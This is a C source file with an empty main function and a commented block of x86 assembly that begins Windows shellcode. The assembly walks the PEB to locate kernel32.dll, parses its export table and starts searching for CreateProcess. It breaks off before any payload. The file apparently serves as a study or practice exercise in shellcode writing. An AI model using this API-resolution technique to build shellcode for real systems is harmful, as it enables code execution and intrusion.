#include <stdio.h>

int main()
{


    return 0;
}

/*
*Shellcode in ASM*
xor ecx, ecx    ; makes ecx == 0
mov eax, fs:[ecx+0x30]  ; get PEB from TEB's offset 0x30
mov eax, [eax+0xc]  ; get loaded modules into this process's info
mov eax, [eax+0x14] ; access InMemoryOrderModuleList and get info of this exe
mov eax, [eax]  ; get info of ntdll.dll
mov eax, [eax]  ; get info of kernel32.dll
mov ebx, [eax+0x10] ; get address of kernel32.dll loaded in memory
mov edx, [ebx+0x3c] ; get e_lfanew which has the offset location of PE header
add edx, ebx    ; get the exact location of the PE header
mov edx, [edx+0x78] ; get the offset of export table
add edx, ebx    ; get the exact location of the export table
mov edx, [edx+0x20] ; get AddressofNames offset
add edx, ebx    ; get the exact location of the AddressofNames
Get_CreateProc_Index:
inc ecx ; increment index counter for AddressOfNameOrdinals later

*/
